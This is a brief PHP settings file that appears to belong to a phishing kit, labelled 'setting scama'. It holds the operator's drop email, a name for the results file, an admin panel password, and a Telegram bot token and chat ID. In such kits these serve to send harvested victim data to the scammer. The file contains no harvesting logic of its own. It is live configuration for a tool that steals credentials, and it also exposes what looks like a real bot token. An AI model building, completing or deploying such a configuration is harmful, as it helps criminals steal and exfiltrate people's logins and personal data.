<?php
// setting scama
$yourmail  = "x13test@skiff.com";  // your email 
$namerand = "rzlt";  // name for file rzult *
$pass = "dddddd"; // pass admin panel
$botToken="6552041496:AAFovgB_E8GM0ap5PnYRiWHicNdKVq4D7A8"; // token bot telegram
$chatId="240837047";  // chatId telegram

?>